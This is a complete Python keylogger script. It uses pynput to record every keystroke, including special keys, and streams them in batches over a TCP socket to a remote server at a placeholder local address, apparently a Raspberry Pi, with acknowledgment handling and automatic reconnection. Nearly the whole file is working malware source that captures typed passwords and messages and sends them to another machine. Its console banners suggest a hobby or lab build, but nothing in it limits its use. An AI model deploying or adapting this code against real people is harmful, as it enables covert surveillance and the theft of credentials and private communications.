from pynput import keyboard
import socket
import time

# Server details - UPDATE THIS
SERVER_IP = "192.168.1.XXX"  # Replace with your Raspberry Pi IP address
SERVER_PORT = 9999

# Buffer to store keystrokes
keystroke_buffer = []
last_send_time = time.time()
client_socket = None

# Connect to the server
def connect_to_server():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((SERVER_IP, SERVER_PORT))
        print(f"[+] Connected to server at {SERVER_IP}:{SERVER_PORT}")
        return sock
    except Exception as e:
        print(f"[-] Failed to connect to server: {e}")
        return None

# Send keystrokes to server
def send_keystrokes():
    global keystroke_buffer, last_send_time, client_socket
    
    if not keystroke_buffer or not client_socket:
        return False
    
    try:
        keystrokes_str = ''.join(keystroke_buffer)
        print(f"[+] Sending keystrokes: {keystrokes_str}")
        
        # Send data to server
        client_socket.send(keystrokes_str.encode('utf-8'))
        
        # Wait for acknowledgment
        response = client_socket.recv(1024)
        if response == b"ACK":
            keystroke_buffer = []
            last_send_time = time.time()
            print("[+] Keystrokes sent successfully")
            return True
        else:
            print("[-] Unexpected response from server")
            return False
    except Exception as e:
        print(f"[-] Error sending data: {e}")
        # Try to reconnect
        client_socket = connect_to_server()
        return False

# Process keypress
def on_press(key):
    global keystroke_buffer, last_send_time
    
    try:
        # Get character representation of the key
        if hasattr(key, 'char') and key.char:
            keystroke_buffer.append(key.char)
            print(f"[*] Recorded: {key.char}")
        else:
            # Handle special keys
            key_name = str(key).replace('Key.', '[') + ']'
            keystroke_buffer.append(key_name)
            print(f"[*] Recorded special key: {key_name}")
        
        # Send keystrokes in batches or after a time threshold
        current_time = time.time()
        if len(keystroke_buffer) >= 5 or (current_time - last_send_time) > 3:
            send_keystrokes()
    
    except Exception as e:
        print(f"[-] Error processing keystroke: {e}")

# Main function
if __name__ == "__main__":
    # Connect to the server
    client_socket = connect_to_server()
    
    if not client_socket:
        print("[-] Could not connect to server. Exiting.")
        exit(1)
    
    print("======================================")
    print("     SOCKET-BASED KEYLOGGER STARTED   ")
    print("======================================")
    print("[*] Keylogger is now active and running...")
    print("[*] All keystrokes will be sent to the server.")
    print("[*] Press Ctrl+C to stop the keylogger.")
    
    # Start the listener
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    
    try:
        # Keep the script running and periodically check for unsent keystrokes
        while True:
            # Check if we should send keystrokes due to timeout
            current_time = time.time()
            if keystroke_buffer and (current_time - last_send_time) > 3:
                send_keystrokes()
            time.sleep(1)
    except KeyboardInterrupt:
        # Send any remaining keystrokes before exiting
        if keystroke_buffer:
            send_keystrokes()
        print("\n[*] Keylogger stopped.")
        if client_socket:
            client_socket.close()
        listener.stop()
